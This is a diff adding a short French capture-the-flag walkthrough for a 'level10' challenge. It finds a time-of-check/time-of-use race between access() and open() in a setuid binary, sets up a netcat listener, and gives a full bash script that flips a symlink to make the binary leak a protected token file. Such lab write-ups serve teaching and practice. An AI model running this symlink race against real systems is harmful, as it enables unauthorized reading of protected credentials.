@@ -1,0 +1,56 @@
+Piste:
+
+On recupere l'executable 
+dans un terminal neutre
+
+scp -P 4242 level10@10.11.248.91:/home/user/level10/level10 /tmp/level10
+
+On envoie le fichier a dogbolt
+
+on a analyser le fichier :
+
+Le programme vérifie d’abord les droits d’accès au fichier avec access(), puis ouvre le fichier plus tard avec open().
+
+Cela crée une fenêtre de vulnérabilité : on peut remplacer le fichier entre les deux appels (race condition) et forcer le binaire à lire le token.
+
+
+while true; do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
+
+Ici on atten que le programme level10 envoie le contenu du fichier token.
+
+
+On prepare un executable
+vim /tmp/getflag.sh
+
+
+
+#!/bin/bash
+
+random_file=$(mktemp /tmp/fileXXXX)   # fichier temporaire vide
+link_name=$(mktemp -u /tmp/linkXXXX) # nom de lien temporaire
+
+# Boucle qui exécute level10 en continu
+while true; do
+    /home/user/level10/level10 $link_name 127.0.0.1 &>/dev/null
+done &
+
+# Boucle qui change rapidement le lien symbolique
+while true; do
+    ln -fs /home/user/level10/token $link_name
+    ln -fs $random_file $link_name
+done
+
+
+
+on le rends executable
+
+chmod +x /tmp/getflag.sh
+
+dans le terminal2
+
+```c
+/tmp/getflag.sh
+```
+
+dans le terminal on recupe le mot de passe.
+
